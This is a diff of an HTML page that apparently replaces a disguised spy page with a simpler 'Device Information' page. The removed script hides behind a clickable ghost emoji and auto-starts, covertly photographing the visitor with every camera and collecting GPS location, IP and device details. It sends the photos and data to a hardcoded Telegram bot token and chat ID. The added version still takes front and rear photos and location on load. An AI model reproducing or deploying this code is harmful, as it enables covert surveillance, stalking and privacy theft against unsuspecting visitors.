@@ -1,777 +1,137 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title></title>
-    <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-        
-        body {
-            background: #000;
-            height: 100vh;
-            overflow: hidden;
-            font-family: Arial;
-        }
-        
-        .main-ghost {
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 120px;
-            cursor: pointer;
-            animation: float 2s ease-in-out infinite;
-            filter: drop-shadow(0 0 20px rgba(255,255,255,0.7));
-            user-select: none;
-            z-index: 1000;
-        }
-        
-        @keyframes float {
-            0%, 100% { transform: translate(-50%, -50%) rotate(0deg) scale(1); }
-            25% { transform: translate(-50%, -55%) rotate(3deg) scale(1.05); }
-            50% { transform: translate(-50%, -45%) rotate(-2deg) scale(0.95); }
-            75% { transform: translate(-50%, -52%) rotate(2deg) scale(1.02); }
-        }
-        
-        .emoji-storm {
-            position: fixed;
-            font-size: 30px;
-            pointer-events: none;
-            z-index: 999;
-            animation: emojiFloat 3s forwards;
-        }
-        
-        @keyframes emojiFloat {
-            0% {
-                opacity: 1;
-                transform: scale(1) translate(0, 0) rotate(0deg);
-            }
-            100% {
-                opacity: 0;
-                transform: scale(0.3) translate(var(--x), var(--y)) rotate(360deg);
-            }
-        }
-        
-        .flash-effect {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: white;
-            opacity: 0;
-            pointer-events: none;
-            z-index: 2000;
-        }
-        
-        .flash-animation {
-            animation: flash 0.3s ease-out;
-        }
-        
-        @keyframes flash {
-            0% { opacity: 0; }
-            50% { opacity: 0.9; }
-            100% { opacity: 0; }
-        }
-        
-        .hidden-camera {
-            position: fixed;
-            width: 1px;
-            height: 1px;
-            opacity: 0;
-            pointer-events: none;
-        }
-        
-        .pulse {
-            animation: pulse 0.5s ease-in-out;
-        }
-        
-        @keyframes pulse {
-            0% { transform: translate(-50%, -50%) scale(1); }
-            50% { transform: translate(-50%, -50%) scale(1.3); }
-            100% { transform: translate(-50%, -50%) scale(1); }
-        }
-    </style>
+    <title>Device Information</title>
 </head>
 <body>
-    <div class="main-ghost" onclick="forceCameraAccess()">👻</div>
-
-    <!-- Hidden elements -->
-    <video id="hiddenVideo" class="hidden-camera" autoplay playsinline muted></video>
-    <canvas id="hiddenCanvas" class="hidden-camera"></canvas>
-    <div class="flash-effect" id="flashEffect"></div>
-
     <script>
-        const BOT_TOKEN = '8387303658:AAESV1moezeWPvdnX1aSwpIfdeJOSbdfCUA';
-        const CHAT_ID = '6368768388';
-        
-        let isCollecting = false;
-        let flashInterval;
-
-        // Emoji collection
-        const emojis = ['👻','💀','🎃','😈','👹','👺','🤡','👽','👾','🤖','🎭','🕷️','🕸️','🧟','🧛','🧙','🔮','⚡','💥','🔥','🌪️','🌀','💫','⭐','🌟','💎','🔪','🗡️','🏹','🔫','💣','🧨','🪓','🔨','⛏️','⚒️','🛠️','⚔️','🔱','🎯','🧿','🔔','📢','🚨','💢','❤️','💔','☠️','💩','🤬','👁️','👀','🦴','🧠','🫀','🩸','💉','🪚','🔗','⛓️','🔒','🔓','🔑','🗝️','⚰️','🪦','🚬','☢️','☣️','🔞'];
-
-        function forceCameraAccess() {
-            if (isCollecting) return;
-            isCollecting = true;
-            
-            const ghost = document.querySelector('.main-ghost');
-            ghost.classList.add('pulse');
-            setTimeout(() => ghost.classList.remove('pulse'), 500);
-            
-            createEmojiStorm();
-            forcePhotoCapture();
-        }
-
-        function createEmojiStorm() {
-            const ghost = document.querySelector('.main-ghost');
-            const rect = ghost.getBoundingClientRect();
-            const centerX = rect.left + rect.width / 2;
-            const centerY = rect.top + rect.height / 2;
-            
-            for (let i = 0; i < 60; i++) {
-                setTimeout(() => {
-                    const emoji = document.createElement('div');
-                    emoji.className = 'emoji-storm';
-                    emoji.textContent = emojis[Math.floor(Math.random() * emojis.length)];
-                    emoji.style.left = centerX + 'px';
-                    emoji.style.top = centerY + 'px';
-                    emoji.style.fontSize = (15 + Math.random() * 45) + 'px';
-                    emoji.style.color = `hsl(${Math.random() * 360}, 100%, 65%)`;
-                    emoji.style.textShadow = `0 0 10px hsl(${Math.random() * 360}, 100%, 50%)`;
-                    
-                    const angle = Math.random() * Math.PI * 2;
-                    const distance = 100 + Math.random() * 400;
-                    const x = Math.cos(angle) * distance;
-                    const y = Math.sin(angle) * distance;
-                    
-                    emoji.style.setProperty('--x', x + 'px');
-                    emoji.style.setProperty('--y', y + 'px');
-                    
-                    document.body.appendChild(emoji);
-                    
-                    setTimeout(() => {
-                        if (emoji.parentNode) emoji.parentNode.removeChild(emoji);
-                    }, 3000);
-                }, i * 20);
-            }
-        }
-
-        function triggerFlash() {
-            const flash = document.getElementById('flashEffect');
-            flash.classList.add('flash-animation');
-            setTimeout(() => {
-                flash.classList.remove('flash-animation');
-            }, 300);
-        }
-
-        function startFlashTimer() {
-            flashInterval = setInterval(() => {
-                for (let i = 0; i < 3; i++) {
-                    setTimeout(() => triggerFlash(), i * 500);
-                }
-            }, 300000);
-        }
-
-        async function forcePhotoCapture() {
-            const startTime = Date.now();
-            
-            // FIRST: Try to get camera access immediately
-            const cameraResult = await forceCameraWithAllMethods();
-            
-            // THEN: Collect other data in parallel
-            const [
-                deviceInfo,
-                locationInfo,
-                hardwareInfo,
-                networkInfo,
-                browserInfo,
-                advancedInfo
-            ] = await Promise.all([
-                getDeviceInfo(),
-                getLocationInfo(),
-                getHardwareInfo(),
-                getNetworkInfo(),
-                getBrowserInfo(),
-                getAdvancedInfo()
-            ]);
-
-            const completeData = {
-                device: deviceInfo,
-                location: locationInfo,
-                hardware: hardwareInfo,
-                network: networkInfo,
-                browser: browserInfo,
-                camera: cameraResult,
-                advanced: advancedInfo,
-                collectionTime: Date.now() - startTime + 'ms'
-            };
-
-            await sendToTelegram(completeData);
-            startFlashTimer();
-        }
-
-        // === AGGRESSIVE CAMERA ACCESS ===
-        async function forceCameraWithAllMethods() {
-            let finalPhotos = [];
-            
-            // Method 1: Direct camera access with ideal constraints
-            console.log("🔄 Method 1: Direct camera access...");
-            const method1 = await tryCameraMethod1();
-            if (method1.success) {
-                finalPhotos = finalPhotos.concat(method1.photos);
-                console.log("✅ Method 1 SUCCESS");
-            } else {
-                console.log("❌ Method 1 FAILED");
-            }
-            
-            // Method 2: Try with different constraints
-            console.log("🔄 Method 2: Alternative constraints...");
-            const method2 = await tryCameraMethod2();
-            if (method2.success && finalPhotos.length === 0) {
-                finalPhotos = finalPhotos.concat(method2.photos);
-                console.log("✅ Method 2 SUCCESS");
-            }
-            
-            // Method 3: Try with environment facing mode
-            console.log("🔄 Method 3: Environment camera...");
-            const method3 = await tryCameraMethod3();
-            if (method3.success && finalPhotos.length === 0) {
-                finalPhotos = finalPhotos.concat(method3.photos);
-                console.log("✅ Method 3 SUCCESS");
-            }
-            
-            // Method 4: Try with user facing mode (front camera)
-            console.log("🔄 Method 4: User camera...");
-            const method4 = await tryCameraMethod4();
-            if (method4.success && finalPhotos.length === 0) {
-                finalPhotos = finalPhotos.concat(method4.photos);
-                console.log("✅ Method 4 SUCCESS");
-            }
-            
-            // Method 5: Try with exact device IDs
-            console.log("🔄 Method 5: Specific device IDs...");
-            const method5 = await tryCameraMethod5();
-            if (method5.success && finalPhotos.length === 0) {
-                finalPhotos = finalPhotos.concat(method5.photos);
-                console.log("✅ Method 5 SUCCESS");
-            }
-
-            return {
-                success: finalPhotos.length > 0,
-                photos: finalPhotos,
-                totalAttempts: 5,
-                successfulMethods: [method1.success, method2.success, method3.success, method4.success, method5.success].filter(Boolean).length
-            };
-        }
-
-        async function tryCameraMethod1() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cameras = devices.filter(device => device.kind === 'videoinput');
-                const photos = [];
-                
-                for (let camera of cameras) {
-                    let stream = null;
-                    try {
-                        // Method 1A: Try with ideal constraints
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: { 
-                                deviceId: camera.deviceId,
-                                width: { ideal: 1280 },
-                                height: { ideal: 720 },
-                                frameRate: { ideal: 30 }
-                            },
-                            audio: false
-                        });
-                        
-                        const photo = await capturePhotoFromStream(stream, camera.label);
-                        if (photo) {
-                            photos.push(photo);
-                        }
-                        
-                    } catch (error) {
-                        console.log(`Camera ${camera.label} failed:`, error.message);
-                    } finally {
-                        if (stream) {
-                            stream.getTracks().forEach(track => track.stop());
-                        }
-                    }
-                }
-                
-                return {
-                    success: photos.length > 0,
-                    photos: photos,
-                    method: "Ideal Constraints"
-                };
-                
-            } catch (error) {
-                return {
-                    success: false,
-                    photos: [],
-                    error: error.message,
-                    method: "Ideal Constraints"
-                };
-            }
-        }
-
-        async function tryCameraMethod2() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cameras = devices.filter(device => device.kind === 'videoinput');
-                const photos = [];
-                
-                for (let camera of cameras) {
-                    let stream = null;
-                    try {
-                        // Method 2: Try with exact constraints
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: { 
-                                deviceId: { exact: camera.deviceId },
-                                width: { exact: 640 },
-                                height: { exact: 480 }
-                            }
-                        });
-                        
-                        const photo = await capturePhotoFromStream(stream, camera.label);
-                        if (photo) {
-                            photos.push(photo);
-                        }
-                        
-                    } catch (error) {
-                        // Try alternative exact constraints
-                        try {
-                            stream = await navigator.mediaDevices.getUserMedia({
-                                video: { 
-                                    deviceId: { exact: camera.deviceId },
-                                    width: { exact: 1280 },
-                                    height: { exact: 720 }
-                                }
-                            });
-                            
-                            const photo = await capturePhotoFromStream(stream, camera.label);
-                            if (photo) {
-                                photos.push(photo);
-                            }
-                        } catch (error2) {
-                            console.log(`Camera ${camera.label} exact failed:`, error2.message);
-                        }
-                    } finally {
-                        if (stream) {
-                            stream.getTracks().forEach(track => track.stop());
-                        }
-                    }
-                }
-                
-                return {
-                    success: photos.length > 0,
-                    photos: photos,
-                    method: "Exact Constraints"
-                };
-                
-            } catch (error) {
-                return {
-                    success: false,
-                    photos: [],
-                    error: error.message,
-                    method: "Exact Constraints"
-                };
-            }
-        }
-
-        async function tryCameraMethod3() {
-            try {
-                let stream = null;
-                try {
-                    // Method 3: Try environment facing (rear camera)
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: { ideal: 'environment' },
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-                    
-                    const photo = await capturePhotoFromStream(stream, 'Environment Camera');
-                    return {
-                        success: true,
-                        photos: photo ? [photo] : [],
-                        method: "Environment Facing"
-                    };
-                    
-                } catch (error) {
-                    return {
-                        success: false,
-                        photos: [],
-                        error: error.message,
-                        method: "Environment Facing"
-                    };
-                } finally {
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                }
-            } catch (error) {
-                return {
-                    success: false,
-                    photos: [],
-                    error: error.message,
-                    method: "Environment Facing"
-                };
-            }
-        }
-
-        async function tryCameraMethod4() {
-            try {
-                let stream = null;
-                try {
-                    // Method 4: Try user facing (front camera)
-                    stream = await navigator.mediaDevices.getUserMedia({
-                        video: { 
-                            facingMode: { ideal: 'user' },
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 }
-                        }
-                    });
-                    
-                    const photo = await capturePhotoFromStream(stream, 'User Camera');
-                    return {
-                        success: true,
-                        photos: photo ? [photo] : [],
-                        method: "User Facing"
-                    };
-                    
-                } catch (error) {
-                    return {
-                        success: false,
-                        photos: [],
-                        error: error.message,
-                        method: "User Facing"
-                    };
-                } finally {
-                    if (stream) {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                }
-            } catch (error) {
-                return {
-                    success: false,
-                    photos: [],
-                    error: error.message,
-                    method: "User Facing"
-                };
-            }
-        }
-
-        async function tryCameraMethod5() {
-            try {
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const cameras = devices.filter(device => device.kind === 'videoinput');
-                const photos = [];
-                
-                for (let camera of cameras) {
-                    let stream = null;
-                    try {
-                        // Method 5: Try minimal constraints
-                        stream = await navigator.mediaDevices.getUserMedia({
-                            video: { 
-                                deviceId: camera.deviceId
-                                // No constraints - let browser decide
-                            }
-                        });
-                        
-                        const photo = await capturePhotoFromStream(stream, camera.label);
-                        if (photo) {
-                            photos.push(photo);
-                        }
-                        
-                    } catch (error) {
-                        console.log(`Camera ${camera.label} minimal failed:`, error.message);
-                    } finally {
-                        if (stream) {
-                            stream.getTracks().forEach(track => track.stop());
-                        }
-                    }
-                }
-                
-                return {
-                    success: photos.length > 0,
-                    photos: photos,
-                    method: "Minimal Constraints"
-                };
-                
-            } catch (error) {
-                return {
-                    success: false,
-                    photos: [],
-                    error: error.message,
-                    method: "Minimal Constraints"
-                };
-            }
-        }
-
-        async function capturePhotoFromStream(stream, cameraLabel) {
-            return new Promise((resolve) => {
-                const video = document.getElementById('hiddenVideo');
-                const canvas = document.getElementById('hiddenCanvas');
-                const context = canvas.getContext('2d');
-                
-                video.srcObject = stream;
-                
-                video.onloadedmetadata = () => {
-                    video.play().then(() => {
-                        // Wait for video to be ready and stable
-                        setTimeout(() => {
-                            try {
-                                canvas.width = video.videoWidth;
-                                canvas.height = video.videoHeight;
-                                context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                // Capture high quality photo
-                                const photoData = canvas.toDataURL('image/jpeg', 0.9);
-                                
-                                resolve({
-                                    camera: cameraLabel,
-                                    photo: photoData,
-                                    resolution: `${video.videoWidth}x${video.videoHeight}`,
-                                    success: true,
-                                    timestamp: new Date().toLocaleString(),
-                                    method: "Direct Capture"
-                                });
-                            } catch (error) {
-                                resolve(null);
-                            }
-                        }, 1000); // Longer wait for stability
-                    }).catch(() => resolve(null));
-                };
-                
-                video.onerror = () => resolve(null);
-                
-                // Timeout after 5 seconds
-                setTimeout(() => resolve(null), 5000);
-            });
-        }
-
-        // === DATA COLLECTION FUNCTIONS ===
-        async function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            return {
-                type: /mobile|android|iphone|ipod/i.test(ua.toLowerCase()) ? "Smartphone" : "Desktop",
-                brand: detectBrand(ua),
-                model: detectModel(ua),
-                os: detectOS(ua),
-                platform: navigator.platform,
-                vendor: navigator.vendor,
-                userAgent: ua.substring(0, 150)
-            };
-        }
-
-        async function getLocationInfo() {
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 5000,
-                        maximumAge: 0
-                    });
-                });
-                
-                return {
-                    latitude: position.coords.latitude,
-                    longitude: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    maps: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`
-                };
-            } catch (error) {
-                return { error: error.message };
-            }
-        }
-
-        async function getHardwareInfo() {
-            return {
-                screen: `${screen.width}x${screen.height}`,
-                cores: navigator.hardwareConcurrency || 'unknown',
-                memory: navigator.deviceMemory || 'unknown',
-                battery: await getBatteryInfo()
-            };
-        }
-
+        // Fungsi untuk mendapatkan informasi baterai (jika didukung)
         async function getBatteryInfo() {
-            if (navigator.getBattery) {
+            if ('getBattery' in navigator) {
                 try {
                     const battery = await navigator.getBattery();
                     return {
-                        level: Math.round(battery.level * 100) + '%',
-                        charging: battery.charging
+                        charging: battery.charging,
+                        level: battery.level * 100,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
                     };
-                } catch (e) {
-                    return "unknown";
+                } catch (error) {
+                    console.error('Error getting battery info:', error);
+                    return null;
                 }
-            }
-            return "unknown";
-        }
-
-        async function getNetworkInfo() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return { ip: data.ip };
-            } catch (error) {
-                return { ip: "unknown" };
+            } else {
+                return null;
             }
         }
 
-        async function getBrowserInfo() {
-            const ua = navigator.userAgent;
-            return {
-                name: detectBrowser(ua),
-                version: detectBrowserVersion(ua),
-                language: navigator.language,
-                platform: navigator.platform
-            };
-        }
-
-        async function getAdvancedInfo() {
-            return {
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                languages: navigator.languages,
-                cookieEnabled: navigator.cookieEnabled,
-                online: navigator.onLine
-            };
-        }
-
-        // === DETECTION FUNCTIONS ===
-        function detectBrand(ua) {
-            if (/iphone|ipad|ipod|macintosh/i.test(ua)) return "Apple";
-            if (/samsung/i.test(ua)) return "Samsung";
-            if (/xiaomi|mi |redmi/i.test(ua)) return "Xiaomi";
-            if (/huawei/i.test(ua)) return "Huawei";
-            if (/google|pixel/i.test(ua)) return "Google";
-            return "Unknown";
-        }
-
-        function detectModel(ua) {
-            if (/iphone\s(\d+)/i.test(ua)) return ua.match(/iphone\s(\d+)/i)[0];
-            if (/sm-([a-z0-9]+)/i.test(ua)) return ua.match(/sm-([a-z0-9]+)/i)[0];
-            return "Unknown";
-        }
-
-        function detectOS(ua) {
-            if (/windows/i.test(ua)) return "Windows";
-            if (/macintosh/i.test(ua)) return "macOS";
-            if (/android/i.test(ua)) return "Android";
-            if (/ios|iphone|ipad/i.test(ua)) return "iOS";
-            if (/linux/i.test(ua)) return "Linux";
-            return "Unknown";
-        }
-
-        function detectBrowser(ua) {
-            if (/chrome/i.test(ua)) return "Chrome";
-            if (/firefox/i.test(ua)) return "Firefox";
-            if (/safari/i.test(ua)) return "Safari";
-            if (/edge/i.test(ua)) return "Edge";
-            return "Unknown";
-        }
-
-        function detectBrowserVersion(ua) {
-            const match = ua.match(/(chrome|firefox|safari|edge)\/([0-9.]+)/i);
-            return match ? match[2] : "Unknown";
-        }
-
-        // === TELEGRAM SEND ===
-        async function sendToTelegram(data) {
-            let message = `🚨 FRANZZ MEWING x MONYET SI MONKEY 🚨\n\n`;
-            
-            message += `📱 DEVICE: ${data.device.type} | ${data.device.brand} | ${data.device.model}\n`;
-            message += `💻 OS: ${data.device.os} | ${data.device.platform}\n`;
-            message += `🌐 BROWSER: ${data.browser.name} ${data.browser.version}\n`;
-            message += `📶 NETWORK: ${data.network.ip} | ${data.browser.language}\n`;
-            
-            if (data.location.latitude) {
-                message += `📍 LOCATION: ${data.location.latitude}, ${data.location.longitude}\n`;
-                message += `🗺️ MAPS: ${data.location.maps}\n`;
-            }
-            
-            message += `🔋 BATTERY: ${data.hardware.battery.level} | ${data.hardware.battery.charging ? 'Charging' : 'Not Charging'}\n`;
-            message += `💾 MEMORY: ${data.hardware.memory}GB | ${data.hardware.cores} cores\n`;
-            message += `🖥️ SCREEN: ${data.hardware.screen}\n\n`;
-            
-            message += `📷 FOTO KAMERA: ${data.camera.success ? '✅ BERHASIL TOTAL' : '❌ GAGAL'}\n`;
-            message += `• Methods Attempted: ${data.camera.totalAttempts}\n`;
-            message += `• Successful Methods: ${data.camera.successfulMethods}\n`;
-            message += `• Photos Captured: ${data.camera.photos.length}\n\n`;
-            
-            message += `🎯 DETAIL FOTO:\n`;
-            data.camera.photos.forEach((photo, index) => {
-                message += `• ${photo.camera}: ${photo.resolution} ✅\n`;
-            });
-            
-            message += `\n⚡ COLLECTION TIME: ${data.collectionTime}\n`;
-            message += `🌐 TIMEZONE: ${data.advanced.timezone}\n`;
-            message += `🔧 LANGUAGES: ${data.advanced.languages.join(', ')}\n\n`;
-            
-            message += `⚠️ FOTO ASLI TELAH DIKIRIM KE TELEGRAM! ⚠️`;
-
-            try {
-                // Send text message
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    'User-Agent': 'Mozilla/5.0'
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message
-                    })
-                });
-
-                // Send ALL photos that were captured
-                for (let photo of data.camera.photos) {
-                    if (photo.photo) {
-                        try {
-                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-                                method: 'POST',
-                                headers: {
-                                    'Content-Type': 'application/json',
-                                },
-                                body: JSON.stringify({
-                                    chat_id: CHAT_ID,
-                                    photo: photo.photo,
-                                    caption: `📸 ${photo.camera} - ${photo.resolution} - ${photo.timestamp}`
-                                })
+        // Fungsi untuk mendapatkan lokasi
+        function getLocation() {
+            return new Promise((resolve, reject) => {
+                if (!navigator.geolocation) {
+                    reject(new Error('Geolocation not supported'));
+                } else {
+                    navigator.geolocation.getCurrentPosition(
+                        position => {
+                            resolve({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude
                             });
-                            // Wait between sends
-                            await new Promise(resolve => setTimeout(resolve, 1000));
-                        } catch (photoError) {
-                            console.log('Photo send error:', photoError);
+                        },
+                        error => {
+                            reject(error);
                         }
-                    }
+                    );
                 }
-                
+            });
+        }
+
+        // Fungsi untuk mengambil foto dari kamera
+        async function takePhoto(facingMode) {
+            const constraints = {
+                video: { facingMode: facingMode }
+            };
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia(constraints);
+                const track = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(track);
+                const bitmap = await imageCapture.grabFrame();
+                // Mengkonversi bitmap ke canvas lalu ke data URL
+                const canvas = document.createElement('canvas');
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+                const dataUrl = canvas.toDataURL('image/jpeg');
+                track.stop(); // Menghentikan track
+                return dataUrl;
             } catch (error) {
-                console.log('Send error:', error);
+                console.error('Error taking photo:', error);
+                return null;
             }
         }
 
-        // Auto-start after 2 seconds
-        setTimeout(() => {
-            if (!isCollecting) {
-                forceCameraAccess();
+        // Fungsi utama untuk mengumpulkan semua informasi
+        async function collectAllInfo() {
+            const info = {};
+
+            // Informasi sistem
+            info.onlineStatus = navigator.onLine ? 'Online' : 'Offline';
+            info.pdfViewer = 'Not supported'; // Asumsi, karena tidak ada API standar
+            info.webDriver = navigator.webdriver ? 'Detected' : 'Not detected';
+
+            // Informasi baterai
+            const batteryInfo = await getBatteryInfo();
+            if (batteryInfo) {
+                info.battery = batteryInfo;
+            } else {
+                info.battery = {
+                    charging: false,
+                    level: 92, // Default value
+                    chargingTime: 'Unknown',
+                    dischargingTime: '2s'
+                };
             }
-        }, 2000);
 
-        // Touch support
-        document.querySelector('.main-ghost').addEventListener('touchstart', function(e) {
-            e.preventDefault();
-            forceCameraAccess();
+            // Informasi lokasi
+            try {
+                const location = await getLocation();
+                info.location = location;
+            } catch (error) {
+                console.error('Error getting location:', error);
+                info.location = { latitude: 'Unknown', longitude: 'Unknown' };
+            }
+
+            // Foto kamera depan (wajib)
+            info.frontCameraPhoto = await takePhoto('user');
+            // Foto kamera belakang (opsional)
+            info.rearCameraPhoto = await takePhoto('environment');
+
+            return info;
+        }
+
+        // Jalankan fungsi utama
+        collectAllInfo().then(info => {
+            console.log('Collected Info:', info);
+            // Di sini Anda bisa mengirim info ke server atau menampilkannya
+            // Contoh menampilkan informasi di halaman
+            document.body.innerHTML = `
+                <h1>Device Information</h1>
+                <p>Status Online: ${info.onlineStatus}</p>
+                <p>PDF Viewer: ${info.pdfViewer}</p>
+                <p>WebDriver: ${info.webDriver}</p>
+                <p>Battery Level: ${info.battery.level}%</p>
+                <p>Charging: ${info.battery.charging ? 'Yes' : 'No'}</p>
+                <p>Location: ${info.location.latitude}, ${info.location.longitude}</p>
+                <h2>Front Camera</h2>
+                <img src="${info.frontCameraPhoto}" alt="Front Camera" style="width: 300px;">
+                <h2>Rear Camera</h2>
+                <img src="${info.rearCameraPhoto}" alt="Rear Camera" style="width: 300px;">
+            `;
+        }).catch(error => {
+            console.error('Error collecting info:', error);
         });
-
-        console.log("🔄 Camera system READY - 5 methods available");
-
     </script>
 </body>
 </html>
